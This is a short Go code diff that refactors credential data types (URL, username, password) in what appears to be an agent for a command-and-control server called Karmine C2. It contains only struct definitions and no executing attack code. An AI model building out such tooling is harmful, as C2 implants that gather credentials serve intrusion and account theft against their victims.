@@ -38,13 +38,14 @@ type KarResponseObjectFile struct {
 // lives only under 'data' in GenericData object
 
 type KarObjectCred struct {
-	Platform string `json:"platform"`
-	Creds    []struct {
-		Url      string      `json:"url"`
-		Username string      `json:"username"`
-		Password string      `json:"password"`
-		Extras   []MultiType `json:"extras"` // Any extra user data
-	}
+	Platform string  `json:"platform"`
+	Creds    CredObj `json:"creds"`
+}
+
+type CredObj struct {
+	Url      string `json:"url"`
+	Username string `json:"username"`
+	Password string `json:"password"`
 }
 
 // Custom command argument. Lives under KarObjectCmd, received from Karmine C2
